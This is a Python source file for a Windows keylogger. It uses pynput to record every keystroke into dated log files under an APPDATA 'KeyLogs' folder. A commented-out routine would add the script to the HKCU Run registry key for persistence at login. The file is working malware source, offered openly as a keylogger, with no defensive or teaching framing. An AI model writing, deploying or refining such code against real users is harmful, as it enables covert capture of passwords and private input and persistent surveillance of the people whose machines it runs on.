from pynput.keyboard import Key, Listener
import logging
import os
import winreg as reg
import sys
import shutil
from datetime import datetime

class KeyLogger:
    def __init__(self):
        date_today = datetime.now().strftime('%Y-%m-%d')
        log_dir = os.path.join(os.getenv('APPDATA'), 'KeyLogs') #C:/Users/<YourUsername>/AppData/Roaming/KeyLogs/log.key
        os.makedirs(log_dir, exist_ok=True)  # Create directory if it doesn't exist
        log_file = os.path.join(log_dir, f'log_{date_today}.key')

        logging.basicConfig(
            filename=log_file,
            level=logging.DEBUG,
            format='%(asctime)s | %(message)s'
        )
        print(f"Logging keystrokes to {log_file}")

    def log_key(self, key):
        """Log the pressed key to the file."""
        try:
            logging.info(f'Key pressed: {key.char}')
        except AttributeError:
            # Handle special keys like Enter, Space, etc.
            logging.info(f'Special key pressed: {key}')

    def start(self):
        """Start the keylogger."""
        with Listener(on_press=self.log_key) as listener:
            listener.join()

    """def add_to_startup(self):
        # Path to the Python script
        script_path = os.path.abspath(sys.argv[0])
        
        # Add to Windows startup registry
        reg_key = reg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "MyKeylogger"
        
        try:
            registry = reg.OpenKey(reg_key, reg_path, 0, reg.KEY_WRITE)
            reg.SetValueEx(registry, reg_name, 0, reg.REG_SZ, script_path)
            reg.CloseKey(registry)
            print("Keylogger added to startup.")
        except Exception as e:
            print(f"Failed to add keylogger to startup: {e}") """

# Main execution
if __name__ == "__main__":
    keylogger = KeyLogger()

    """keylogger.add_to_startup()"""

    keylogger.start()
